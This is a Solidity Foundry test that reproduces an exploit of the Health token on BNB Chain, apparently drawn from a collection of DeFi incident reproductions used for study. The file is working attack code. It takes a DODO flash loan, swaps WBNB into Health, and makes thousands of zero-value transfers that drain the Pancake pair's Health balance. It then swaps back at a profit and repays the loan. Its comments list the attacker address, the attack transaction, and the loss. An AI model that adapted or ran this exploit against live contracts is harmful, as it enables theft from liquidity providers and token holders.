// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "./interface/cheat.sol";
import "./interface/IWBNB.sol";
import "./interface/IERC20.sol";
import "./interface/IPancakePair.sol";
import "./interface/IPancakeRouter02.sol";
import "./interface/IDODO.sol";

// Total Lost: $4,538
// Chain: BNB
// Attacker: 0xde78112ff006f166e4ccfe1dfe4181c9619d3b5d
// Attack Contract: 0x80e5fc0d72e4814cb52c16a18c2f2b87ef1ea2d4
// Attack Tx: 0xae8ca9dc8258ae32899fe641985739c3fa53ab1f603973ac74b424e165c66ccf
// Vulnerable Contract: 0x32B166e082993Af6598a89397E82e123ca44e74E

contract HealthExp is Test {
    IPancakePair constant Health_WBNB_Pair =
        IPancakePair(0xF375709DbdE84D800642168c2e8bA751368e8D32);
    IPancakeRouter02 constant router =
        IPancakeRouter02(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    WBNB constant wbnb = WBNB(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
    IDODO constant flashLoanPool =
        IDODO(0x0fe261aeE0d1C4DFdDee4102E82Dd425999065F4);
    IERC20 constant Health = IERC20(0x32B166e082993Af6598a89397E82e123ca44e74E);

    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    function setUp() public {
        cheats.createSelectFork("bsc", 22337425);
    }

    function testExp() public {
        // Flashloan
        uint256 balance = wbnb.balanceOf(address(flashLoanPool));
        console2.log(
            "Before attack, WBNB balance of flashLoanPool: ",
            balance / 10 ** 18
        );
        console2.log(
            "Before attack, WBNB balance of pair: ",
            wbnb.balanceOf(address(Health_WBNB_Pair)) / 10 ** 18
        );
        flashLoanPool.flashLoan(38 * 10 ** 18, 0, address(this), "0x00");
    }

    function DPPFlashLoanCall(
        address sender,
        uint256 baseAmount,
        uint256 quoteAmount,
        bytes calldata data
    ) external {
        _flashLoanCallBack(sender, baseAmount, quoteAmount, data);
    }

    function _flashLoanCallBack(
        address sender,
        uint256 baseAmount,
        uint256 quoteAmount,
        bytes calldata data
    ) public {
        console2.log("In flashloan ...");
        // swap WBNB -> Health
        console2.log(
            "Before swap, the balance of pair(WBNB): ",
            wbnb.balanceOf(address(Health_WBNB_Pair))
        );
        console2.log(
            "Before swap, the balance of pair(Health): ",
            Health.balanceOf(address(Health_WBNB_Pair))
        );
        wbnb.approve(address(router), wbnb.balanceOf(address(this)));
        address[] memory path = new address[](2);
        path[0] = address(wbnb);
        path[1] = address(Health);
        router.swapExactTokensForTokens(
            wbnb.balanceOf(address(this)),
            0,
            path,
            address(this),
            block.timestamp
        );
        console2.log(
            "After swap, the balance of this(Health): ",
            Health.balanceOf(address(this))
        );
        console2.log(
            "After swap, the balance of pair(Health): ",
            Health.balanceOf(address(Health_WBNB_Pair))
        );
        // transfer 0
        console2.log("Transfer 0 to anyone, loop 5000");
        for (uint256 i = 0; i < 3000; i++) {
            Health.transfer(msg.sender, 0);
        }
        console2.log(
            "After transfer, the balance of pair(Health): ",
            Health.balanceOf(address(Health_WBNB_Pair))
        );
        // swap Health -> WBNB
        Health.approve(address(router), Health.balanceOf(address(this)));
        address[] memory path2 = new address[](2);
        path2[0] = address(Health);
        path2[1] = address(wbnb);
        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            Health.balanceOf(address(this)),
            0,
            path2,
            address(this),
            block.timestamp
        );
        console2.log(
            "After transfer, the balance of pair(wbnb): ",
            wbnb.balanceOf(address(Health_WBNB_Pair)) / 10 ** 18
        );
        console2.log(
            "After transfer, the balance of this(wbnb): ",
            wbnb.balanceOf(address(this)) / 10 ** 18
        );
        //Return funds
        bool success = wbnb.transfer(address(flashLoanPool), baseAmount);
        if (success) {
            console2.log("Flashloan payback success");
            console2.log(
                "After attack, wbnb balance of this: ",
                wbnb.balanceOf(address(this)) / 1e18
            );
        }
    }
}
